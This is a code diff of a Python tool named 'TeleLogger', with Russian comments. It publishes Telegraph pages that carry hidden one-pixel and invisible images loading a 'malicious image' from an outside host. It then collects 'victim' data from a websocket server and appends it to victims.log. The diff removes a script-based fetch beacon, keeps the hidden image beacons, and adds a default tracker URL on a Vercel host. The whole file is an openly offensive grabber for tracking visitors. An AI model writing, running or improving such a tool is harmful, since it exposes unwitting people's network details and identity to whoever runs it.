@@ -3,7 +3,6 @@ import asyncio
 import websockets
 import json
 import requests
-import base64
 from telegraph import Telegraph
 from datetime import datetime
 import os
@@ -17,33 +16,20 @@ class TeleLogger:
     def create_telegraph_page(self, title, description, image_url):
         """Создает страницу Telegraph с вредоносным изображением"""
         
-        # HTML контент с невидимым изображением
+        # Только разрешенные теги: p, br, b, i, u, a, img и т.д.
         content = f"""
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <title>{title}</title>
-        </head>
-        <body>
-            <h1>{title}</h1>
-            <p>{description}</p>
-            <img src="{image_url}" style="display:none" width="1" height="1">
-            <img src="{image_url}" width="0" height="0" style="position:absolute; visibility:hidden">
-            <script>
-                // Дополнительная отправка через fetch
-                fetch('{image_url}', {{mode: 'no-cors'}});
-            </script>
-            <p>Loading content...</p>
-        </body>
-        </html>
+        <p><b>{title}</b></p>
+        <p>{description}</p>
+        <p><img src="{image_url}" style="display:none" /></p>
+        <p><img src="{image_url}" width="1" height="1" /></p>
+        <p>Loading content...</p>
         """
         
         # Создаем страницу
         response = self.telegraph.create_page(
             title=title,
             html_content=content,
-            author_name="TeleLogger",
-            author_url="https://t.me/TeleLogger"
+            author_name="TeleLogger"
         )
         
         return response['url']
@@ -53,7 +39,6 @@ class TeleLogger:
         async with websockets.connect(self.express_url) as websocket:
             print(f"[+] Connected to Express server at {self.express_url}")
             
-            # Получаем данные о жертвах в реальном времени
             async for message in websocket:
                 data = json.loads(message)
                 self.handle_victim_data(data)
@@ -74,33 +59,31 @@ class TeleLogger:
         print(f"Time: {data.get('timestamp')}")
         print("="*50)
         
-        # Сохраняем в файл
         with open('victims.log', 'a') as f:
             f.write(json.dumps(data) + '\n')
     
     def run(self, title, description, image_url):
-        """Запускает инструмент"""
         print("[+] Creating Telegraph page...")
         page_url = self.create_telegraph_page(title, description, image_url)
         print(f"[+] Page created: {page_url}")
         print(f"[+] Malicious image: {image_url}")
         print("[+] Waiting for victims...")
         
-        # Запускаем WebSocket соединение
         asyncio.get_event_loop().run_until_complete(self.connect_to_express())
 
-# CLI интерфейс
 if __name__ == "__main__":
     print("""
     ╔═══════════════════════════════════════╗
     ║         TeleLogger v1.0               ║
-    ║    Telegram Logger Tool               ║
     ╚═══════════════════════════════════════╝
     """)
     
     title = input("[?] Enter page title: ")
     description = input("[?] Enter page description: ")
-    image_url = input("[?] Enter malicious image URL: ")
+    image_url = input("[?] Enter malicious image URL (default: https://mwr-2w7j.vercel.app/track.jpg): ")
+    
+    if not image_url:
+        image_url = "https://mwr-2w7j.vercel.app/track.jpg"
     
     logger = TeleLogger()
     logger.run(title, description, image_url)
